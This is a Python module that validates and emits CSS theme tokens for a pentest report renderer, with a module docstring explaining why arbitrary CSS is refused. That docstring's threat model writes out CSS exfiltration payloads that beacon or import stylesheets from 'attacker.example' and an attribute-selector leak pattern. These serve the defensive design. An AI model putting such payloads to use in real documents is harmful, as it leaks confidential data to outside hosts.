"""Report **Theme Tokens** — the closed allowlist a Theme's palette is made of, plus the
validators and CSS emission that let a Theme's values reach the page safely (#101).

A :class:`~scribble.reporting.themes.ReportTheme` today is identity plus a stamp; this module supplies
the payload that will eventually hang off it — see ``scribble/CONTEXT.md``'s **Token** entry: "One
named value inside a Theme — a colour, a type stack, a radius. The set of tokens a Theme may set is
closed; a value outside it is not a Theme." This module IS that closed set, for the two Token kinds a
Theme carries token-shaped values for (colour and dimension) plus type stacks — Marks (logos, shapes)
are a different payload entirely and land in #104.

## Why the allowlist is closed, not a CSS blob — the security argument

Trace this payload's whole lifecycle: an operator types it into a form (Theme provenance
``override``), it is stored as data, and at render time it is spliced into the SAME HTML document that
also embeds client evidence and is stamped CONFIDENTIAL (``.confidential`` in the base stylesheet). By
the time this contract carries operator-supplied text, "the Theme editor" and "a CSS injection
sink into a confidential document" are the same code path unless something stands between them.

Arbitrary CSS is not a cosmetic risk in that document — it is an exfiltration primitive:

- ``background: url(https://attacker.example/beacon?x=1)`` fires an outbound request the instant the
  report is opened, no script execution required. So does ``list-style-image``, ``cursor``, ``content:
  url(...)`` on a generated box, border-image, etc. — anything that resolves a URL.
- ``@import url(https://attacker.example/steal.css)`` pulls a whole second stylesheet an attacker
  controls, which can then define its own url()-bearing rules, attribute-selector-based exfiltration
  (``input[value^="a"] { background: url(...) }`` character-at-a-time leaks), or simply keep beaconing
  on a timer via animated properties.
- Even without a network callback, unbounded CSS can visually clobber the page — hide the
  ``.confidential`` banner, redraw a Low finding as if it were absent, or overlay fake content on top
  of real findings. A pentest report is exactly the document where "the page doesn't say what the
  data says" is a serious problem, not a cosmetic one.

None of that requires ``<script>`` — it is why a CSS payload is dangerous even though the surrounding
report already treats richtext HTML with real sanitization elsewhere. The fix is the same shape as any
other injection boundary: never accept the attacker's grammar (arbitrary CSS text) and hand back
STRUCTURED data instead — a fixed set of named slots, each with its own narrow grammar, each rejecting
anything that could open a new CSS construct (a paren for a function call, a semicolon or brace to
close the current declaration/rule early, a backslash for a CSS escape, a newline some parsers treat as
a statement boundary). A named value that isn't on the list, or a value that doesn't match its slot's
grammar, is not a Theme at all — see :func:`validate_tokens`'s wholesale-reject rule below.

## Token catalogue

Enumerated by READING ``reporting/render_html.py``'s ``_CSS`` (not guessed): the light ``:root {}``
block, its ``prefers-color-scheme: dark`` twin guarded by ``:root:not([data-theme="light"])``, the
``:root[data-theme="dark"]`` block, and the further override inside ``@media print`` all define the
*same* sixteen colour custom properties plus three dimension properties — that set is
:data:`COLOUR_TOKENS` and :data:`DIMENSION_TOKENS` below, and a test pins them against the live
stylesheet text so this file cannot silently drift from reality.

Type stacks are different: the stylesheet hardcodes ``font-family`` at ~9 call sites today (a body
stack, and several near-duplicate monospace stacks — ``.mono``, finding IDs, code blocks) with no
custom property backing any of them, so a Theme has nothing to override yet. :data:`FONT_TOKENS` names
three NEW tokens — a body stack, a mono stack, and a display/heading stack — for whoever wires Theme
tokens into ``render_html`` (not this module: see the "files you own" boundary on this ticket) to
introduce as the corresponding ``--font-*`` custom properties and point those ~9 sites at.

## Composing with the four palettes — the specificity argument

:func:`render_token_block` emits exactly one plain ``:root { --name: value; }`` rule — CSS specificity
(0, **1**, 0, 0) (IDs, classes/attrs/pseudo-classes, elements). That is deliberately the LOWEST
specificity any selector in the base stylesheet uses for a palette. Every other palette block is
(0, **2**, 0, 0) or higher:

- ``:root:not([data-theme="light"]) { @media (prefers-color-scheme: dark) { ... } }`` — the ``:not()``
  pseudo-class's specificity is that of its argument (an attribute selector, 1 class-level point) PLUS
  ``:root`` itself (another class-level point) = 2.
- ``:root[data-theme="dark"] { ... }`` — ``:root`` (1) + the attribute selector (1) = 2.
- the ``@media print`` override reuses the same trick — ``:root:not([data-theme="dark"]),
  :root[data-theme="dark"]`` — also 2, and it has to be, per that block's own comment: it exists
  specifically because a plain ``:root`` print rule (specificity 1) LOSES to the two rules above
  regardless of source order, so a dark-mode browser printed dark ink on white paper until the print
  block was bumped to specificity 2 to win the tie-break on source order instead.

A specificity-1 override block therefore ALWAYS loses, in every medium, to whichever specificity-2
palette is active for that medium — dark-on-screen, the ``data-theme="dark"`` stamp, or the print
block. That is true regardless of where the block is appended in the sheet, which is exactly what makes
it "safe to append after the base stylesheet": there is no ordering mistake that lets it leak into
print or into dark mode. The corollary, stated plainly so nobody "fixes" this by accident: **today a
Theme token override is visible only when the light palette is the one in effect** (no ``data-theme``
stamp, and the viewer's OS is not requesting dark). Extending overrides to also win against dark and/or
print is possible — it would need the caller to emit additional specificity-2-or-higher rules scoped to
each context, ordered so print still wins last — but that is integration work for whoever threads this
module into ``render_html`` (out of scope here: this ticket is the token contract, not the wiring), and
it must preserve the one invariant that actually matters for a CONFIDENTIAL document: **paper always
gets the print palette, never an operator-supplied one.**

## Provenance and trust

Nothing in this module knows or cares whether a set of tokens came from a bundled Theme, an installed
one, or an ``override`` (see ``CONTEXT.md``'s **Provenance** entry) — :func:`validate_tokens` applies
the identical closed grammar regardless of source, because a bundled Theme that happened to typo a
value is exactly as dangerous on the page as an adversarial one; the validator does not get to trust
its caller.
"""

from __future__ import annotations

import re
from collections.abc import Callable, Mapping

# --- the closed allowlist, grouped by kind -------------------------------------------------------------
#
# Names match the CSS custom property they set MINUS the leading "--" (``"bg"`` -> ``--bg``): the Token
# name IS the CSS variable name. That keeps this contract a single flat table instead of a second
# name-translation layer that could itself drift out of sync with the stylesheet.

# The sixteen colour custom properties every one of the four palette blocks in ``_CSS`` defines
# (``:root``, the dark ``prefers-color-scheme`` block, ``[data-theme="dark"]``, and ``@media print``).
COLOUR_TOKENS: tuple[str, ...] = (
    "bg", "surface", "surface-2",
    "ink", "ink-2", "muted",
    "line", "line-2",
    "accent", "accent-ink", "accent-wash",
    "sev-critical", "sev-high", "sev-medium", "sev-low", "sev-info",
)

# The three dimension custom properties, declared once in the light ``:root`` block only (they are not
# re-themed per palette in the base stylesheet — a radius or measure is not a light/dark concept).
DIMENSION_TOKENS: tuple[str, ...] = ("radius", "measure", "maxw")

# NEW tokens (no ``--font-*`` custom property exists in ``_CSS`` yet) for the three type stacks the
# stylesheet currently hardcodes inline: the body/UI stack, the monospace stack (finding IDs, code
# blocks, the ``.mono`` class), and a display/heading stack for a Theme's Brand identity (headings fall
# back to the body stack today; a Theme should be able to give ``h1``/``h2``/``h3``/the masthead title a
# distinct display face without touching body text).
FONT_TOKENS: tuple[str, ...] = ("font-body", "font-mono", "font-display")

ALL_TOKEN_NAMES: tuple[str, ...] = COLOUR_TOKENS + DIMENSION_TOKENS + FONT_TOKENS


# --- per-kind validators --------------------------------------------------------------------------------
#
# Every validator: (1) takes ``object`` because this eventually deserializes untrusted JSON, so a caller
# handing us an int/list/None must be refused, never coerced; (2) caps input length BEFORE running its
# grammar check, so no validator ever evaluates an unbounded string; (3) returns the value UNCHANGED on
# success or ``None`` on any failure — never raises, never "fixes up" a near-miss value, because a
# validator that repairs input is a validator an attacker can steer.

_COLOUR_MAX_LEN = 9  # "#" + up to 8 hex digits (#rrggbbaa)
_COLOUR_RE = re.compile(r"#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})")


def _validate_colour(value: object) -> str | None:
    """Strict hex only: ``#rgb`` / ``#rrggbb`` / ``#rrggbbaa``.

    No ``rgb()``/``hsl()``/named colours/``var()`` — anything with a paren, and no function-call
    grammar exists to smuggle a second argument through. The 8-digit (alpha) form is included
    deliberately: the base stylesheet already expresses translucency for things like the confidential
    badge and topbar blur via ``color-mix()``, which is NOT part of this grammar (it still has parens),
    so ``#rrggbbaa`` is the one safe way to let a Theme's ``accent-wash`` or similar carry alpha — it is
    still pure hex, still fixed-length, still zero characters outside ``[0-9a-fA-F#]``.
    """
    if not isinstance(value, str) or not value or len(value) > _COLOUR_MAX_LEN:
        return None
    if _COLOUR_RE.fullmatch(value) is None:
        return None
    return value


_FONT_STACK_MAX_LEN = 160
# Letters, digits, spaces, hyphen, comma, single/double quotes, dot — enough to write any real CSS
# font-family list ("Helvetica Neue", -apple-system, sans-serif, ...) and nothing else. No parens (no
# url()/format()), no semicolon (can't close the declaration early), no "@" (no @import), no colon (no
# new property), no brace/backslash/newline (can't open a new rule or escape out of the string).
_FONT_STACK_CHARSET_RE = re.compile(r"[A-Za-z0-9 ,.'\"-]+")


def _validate_font_stack(value: object) -> str | None:
    """A CSS ``font-family`` value: a comma-separated list of quoted/bare family names.

    The charset allowlist excludes every injection primitive named in the module docstring, but it is
    NOT sufficient on its own, because it admits the quote characters a real font stack needs
    (``'Times New Roman'``). **Quotes must therefore be balanced per family**, and that check IS a
    correctness control, not cosmetics: an unterminated string does not stay inside its own
    declaration. CSS's declaration-list grammar keeps consuming tokens into the open string until the
    next unescaped ``;``, which is the semicolon that was supposed to terminate the NEXT token — so
    one stray quote silently swallows a sibling declaration whole, and a caller that asked to set
    ``--font-body`` and ``--font-mono`` gets one corrupt value and no ``--font-mono`` at all, with no
    error anywhere. (Caught by adversarial review of #101, reproduced against a real CSS tokenizer.)

    So each comma-separated family must be either fully quoted with a matching pair and no interior
    quote, or bare with no quote at all. An empty slot (``",,"``, leading/trailing comma) is refused
    too — that one really is just syntax hygiene.
    """
    if not isinstance(value, str) or not value or len(value) > _FONT_STACK_MAX_LEN:
        return None
    if _FONT_STACK_CHARSET_RE.fullmatch(value) is None:
        return None
    for raw_family in value.split(","):
        family = raw_family.strip()
        if not family:
            return None
        if family[0] in "\"'":
            quote = family[0]
            # Must close with the SAME quote, be more than the quote itself, and carry no interior
            # quote of either kind — "'a'b'" would re-open a string the moment it is emitted.
            if len(family) < 2 or family[-1] != quote:
                return None
            if any(ch in "\"'" for ch in family[1:-1]):
                return None
        elif any(ch in "\"'" for ch in family):
            # A bare family name carrying a quote anywhere is, by definition, unbalanced.
            return None
    return value


_DIMENSION_MAX_LEN = 12
# [0-9], not \d: Python's \d is Unicode-aware and matches all 750 characters in the Nd
# category, so "\u0661\u0660px" (Arabic-Indic one-zero) validated and was emitted verbatim as
# --maxw: \u0661\u0660px; — which no browser parses, so the declaration was silently dropped and the
# Theme half-applied. Not a breakout (the charset carries nothing dangerous and float() still
# bounded it), but the docstring below promises "plain decimal digits" and now that is true.
_DIMENSION_RE = re.compile(r"([0-9]{1,4})(?:\.([0-9]{1,2}))?(px|rem|em|ch|%)")
# Per-unit ceilings: bounded so an override cannot blow the layout up to something unusable (a
# multi-thousand-percent ``--maxw`` or a negative ``--radius`` is a self-inflicted DoS on the report's
# readability, not a confidentiality issue, but "bounded" is explicitly part of this ticket's brief and
# costs nothing to enforce). Negative numbers are rejected structurally — the grammar has no ``-`` sign.
_DIMENSION_UNIT_MAX: dict[str, float] = {
    "px": 4000.0,
    "rem": 100.0,
    "em": 100.0,
    "ch": 400.0,
    "%": 1000.0,
}


def _validate_dimension(value: object) -> str | None:
    """A single non-negative number with one allowed unit: ``px`` / ``rem`` / ``em`` / ``ch`` / ``%``.

    No calc(), no unitless numbers, no scientific notation (the regex requires plain decimal digits),
    no whitespace between the number and its unit — one token, one meaning.
    """
    if not isinstance(value, str) or not value or len(value) > _DIMENSION_MAX_LEN:
        return None
    match = _DIMENSION_RE.fullmatch(value)
    if match is None:
        return None
    whole, frac, unit = match.groups()
    number = float(f"{whole}.{frac}" if frac else whole)
    if number > _DIMENSION_UNIT_MAX[unit]:
        return None
    return value


_VALIDATORS: dict[str, Callable[[object], str | None]] = {
    **{name: _validate_colour for name in COLOUR_TOKENS},
    **{name: _validate_dimension for name in DIMENSION_TOKENS},
    **{name: _validate_font_stack for name in FONT_TOKENS},
}

# The public closed set: a name not in here is not a Token, full stop — see ``validate_tokens``.
ALLOWED_TOKENS: frozenset[str] = frozenset(_VALIDATORS)


def validate_tokens(raw: Mapping[str, object]) -> dict[str, str] | None:
    """Validate a whole candidate Token payload; ``None`` means "reject all of it".

    This is a WHOLESALE gate, never a filter: if any key is unknown, or any value fails that key's
    validator, the entire mapping is rejected and ``None`` comes back — not a dict with the bad entries
    quietly dropped. A caller must not be able to smuggle one bad token in behind nine good ones and get
    a partially-themed report back; by the time this function runs, ``raw`` is operator-supplied data
    (Theme provenance ``override``, see the module docstring), and a partial apply is worse than no
    Theme at all in two concrete ways: (1) it teaches an attacker which of their probe values survived
    validation, turning this into an oracle they can iterate against, and (2) it means "the Theme looks
    almost right, one colour didn't take" becomes a silent, confusing failure mode for an operator
    instead of a loud, fixable rejection at save time.

    Returns ``{}`` (not ``None``) for an empty mapping — "this Theme sets no token overrides" is a
    legal, fully-valid Theme (every value falls back to the bundled default), distinct from "this
    payload is invalid".
    """
    if not isinstance(raw, Mapping):
        return None
    validated: dict[str, str] = {}
    for name, value in raw.items():
        if not isinstance(name, str):
            return None
        validator = _VALIDATORS.get(name)
        if validator is None:
            return None
        clean = validator(value)
        if clean is None:
            return None
        validated[name] = clean
    return validated


def render_token_block(tokens: Mapping[str, str], selector: str = ":root") -> str:
    """Emit ``<selector> { --name: value; ... }`` for an already-:func:`validate_tokens`-cleared mapping.

    ``selector`` is the caller's, because WHERE in the cascade an override sits is a composition
    decision (see :mod:`scribble.reporting.theme_css`), not a token-contract one. It defaults to the
    lowest-specificity ``:root`` this module reasons about below. This function is the ONLY emitter:
    a second one that skipped the re-validation below is exactly the write-path/render-path split
    ``marks.resolve_mark`` was restructured to eliminate, after cream shipped a real bug that way.

    See the module docstring's "Composing with the four palettes" section for the full specificity
    argument; in short, this emits the single lowest-specificity selector the base stylesheet uses for
    a palette, which is exactly what guarantees it is safe to append AFTER the whole base stylesheet
    without special-casing where: it can only ever win against the plain light ``:root {}`` rule, and it
    structurally cannot outrank the higher-specificity dark-mode or ``@media print`` palette rules
    regardless of source order — so an operator-supplied Theme can never re-colour the printed,
    client-handed deliverable.

    Defense in depth, not the primary gate: every value is re-run through its own validator before
    emission and a failure raises rather than emits, so a future caller that forgets to run
    :func:`validate_tokens` first (or mutates the dict afterward) gets a loud ``ValueError`` instead of
    a silent injection reaching the page. The intended, and only supported, calling convention is
    ``render_token_block(validate_tokens(raw))`` with the ``None`` case handled by the caller first.
    """
    if not tokens:
        return ""
    lines: list[str] = []
    for name, value in sorted(tokens.items()):
        validator = _VALIDATORS.get(name)
        if validator is None or validator(value) != value:
            raise ValueError(f"refusing to emit unvalidated theme token {name!r}")
        lines.append(f"  --{name}: {value};")
    body = "\n".join(lines)
    return f"{selector} {{\n{body}\n}}\n"
